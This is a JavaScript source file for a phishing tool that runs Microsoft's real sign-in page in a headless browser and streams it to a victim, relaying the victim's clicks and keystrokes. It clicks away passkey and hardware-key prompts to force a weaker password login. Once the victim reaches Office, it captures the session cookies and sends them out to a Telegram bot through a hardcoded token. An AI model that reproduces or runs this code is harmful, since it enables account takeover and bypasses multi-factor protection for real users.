const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function sendExfiltrationAlert(data) {
    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
    try {
        await axios.post(url, { 
            chat_id: CHAT_ID, 
            text: `🚀 *COOKIES CAPTURED*\\n\\n\`\`\`json\\n${JSON.stringify(data, null, 2).substring(0, 4000)}\\n\`\`\``,
            parse_mode: 'Markdown'
        });
    } catch (e) { console.error('Exfil error:', e.message); }
}

async function startSession(io, socket) {
    console.log(`[INIT] Cancel-Prioritized Session: ${socket.id}`);
    let browser;

    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });

        const page = await browser.newPage();
        await page.setViewport({ width: 1280, height: 720 });

        const emitFrame = async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 35 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        };

        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});
        const heartbeat = setInterval(emitFrame, 1300);

        /**
         * THE CANCEL-RECOVERY LOOP
         * Prioritizes 'Cancel' and 'Other ways' to break Passkey loops.
         */
        const interceptor = setInterval(async () => {
            if (!socket.connected) return clearInterval(interceptor);
            try {
                // 1. Prioritize Cancel/Back to escape hardware prompts
                const escapeTargets = [
                    '#idBtn_Back',              // The standard "Cancel" or "Back" button
                    '#cancelButton',            // Alternate cancel ID
                    '#otherWays',               // "Other ways to sign in"
                    '#iShowSkip',               // "Skip for now" (on security info screens)
                    'a[data-bind*="switchToPassword"]' // "Use your password instead"
                ];

                for (const selector of escapeTargets) {
                    const el = await page.$(selector);
                    if (el) {
                        console.log(`[BYPASS] Found Escape Target: ${selector}`);
                        await el.click();
                        return await emitFrame(); // Exit loop after one click to let page refresh
                    }
                }

                // 2. Fallback to 'Next' only if no escape targets are found
                const nextButtons = ['#iNext', 'input[value="Next"]'];
                for (const selector of nextButtons) {
                    const el = await page.$(selector);
                    if (el) {
                        console.log(`[BYPASS] Fallback to Next: ${selector}`);
                        await el.click();
                        break;
                    }
                }
            } catch (err) {}
        }, 2500);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
                await emitFrame();
            } catch (e) {}
        });

        page.on('framenavigated', async (frame) => {
            if (frame.url().includes('shell/homepage') || frame.url().includes('office.com')) {
                const cookies = await page.cookies();
                await sendExfiltrationAlert(cookies);
                socket.emit('success');
            }
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(interceptor);
            if (browser) await browser.close();
        });

    } catch (error) {
        console.error('[CRITICAL]', error.message);
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
